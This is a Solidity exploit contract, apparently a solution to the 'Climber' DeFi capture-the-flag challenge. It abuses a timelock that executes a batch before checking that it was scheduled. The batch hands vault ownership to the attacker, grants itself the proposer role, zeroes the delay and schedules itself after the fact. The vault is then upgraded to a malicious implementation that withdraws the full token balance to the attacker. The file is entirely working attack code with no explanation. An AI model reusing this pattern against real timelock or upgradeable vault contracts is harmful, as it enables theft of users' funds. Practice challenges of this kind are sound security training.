// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "./ClimberVault.sol";
import {PROPOSER_ROLE} from "./ClimberConstants.sol";

import "hardhat/console.sol";

contract Proposer {
    function propose(address vault, address timelock, address attacker) public {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);

        targets[0] = address(vault);
        dataElements[0] = abi.encodeWithSignature(
            "transferOwnership(address)",
            address(attacker)
        );

        targets[1] = address(timelock);
        dataElements[1] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            PROPOSER_ROLE,
            address(this)
        );

        targets[2] = address(timelock);
        dataElements[2] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        targets[3] = address(this);
        dataElements[3] = abi.encodeWithSignature(
            "propose(address,address,address)",
            vault,
            timelock,
            attacker
        );

        console.logBytes32(
            ClimberTimelock(payable(timelock)).getOperationId(
                targets,
                values,
                dataElements,
                bytes32(0)
            )
        );

        ClimberTimelock(payable(timelock)).schedule(
            targets,
            values,
            dataElements,
            bytes32(0)
        );
    }
}

contract NewVault is ClimberVault {
    function withdrawAll(address token, address recipient) public onlyOwner {
        SafeTransferLib.safeTransfer(
            token,
            recipient,
            IERC20(token).balanceOf(address(this))
        );
    }
}

contract ClimberAttacker {
    ClimberTimelock public timelock;
    ClimberVault public vault;
    address public owner;

    constructor(address _vault) {
        vault = ClimberVault(_vault);
        timelock = ClimberTimelock(payable(vault.owner()));
        owner = msg.sender;
    }

    function attack(address token) public {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);

        Proposer proposer = new Proposer();

        targets[0] = address(vault);
        dataElements[0] = abi.encodeWithSignature(
            "transferOwnership(address)",
            address(this)
        );

        targets[1] = address(timelock);
        dataElements[1] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            PROPOSER_ROLE,
            address(proposer)
        );

        targets[2] = address(timelock);
        dataElements[2] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        targets[3] = address(proposer);
        dataElements[3] = abi.encodeWithSignature(
            "propose(address,address,address)",
            vault,
            timelock,
            address(this)
        );

        console.logBytes32(
            timelock.getOperationId(targets, values, dataElements, bytes32(0))
        );

        console.log("Attacking...");

        timelock.execute(targets, values, dataElements, bytes32(0));

        require(vault.owner() == address(this), "Failed to transfer ownership");

        NewVault newVault = new NewVault();
        vault.upgradeTo(address(newVault));
        NewVault(address(vault)).withdrawAll(token, owner);
    }
}
